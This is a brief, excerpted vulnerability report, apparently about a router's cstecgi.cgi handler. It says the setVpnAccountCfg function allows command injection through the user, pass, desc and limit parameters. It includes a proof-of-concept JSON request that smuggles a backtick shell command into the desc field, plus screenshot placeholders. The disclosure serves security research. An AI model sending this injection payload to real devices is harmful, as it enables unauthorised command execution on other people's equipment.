...
The vulnerability is located in the function `FUN_414810` within `cstecgi.cgi`, also known as `setVpnAccountCfg`.

![](Pasted%20image%2020231128205504.png)

![](Pasted%20image%2020231128205524.png)
...
therefore , by controlling parameter among `user, pass ,desc ,limit` , we can finally make an arbitrary command execution
...
{"type":"1","addEffect":"2","desc":"`id > /1.txt;`","topicurl":"setVpnAccountCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231128205827.png)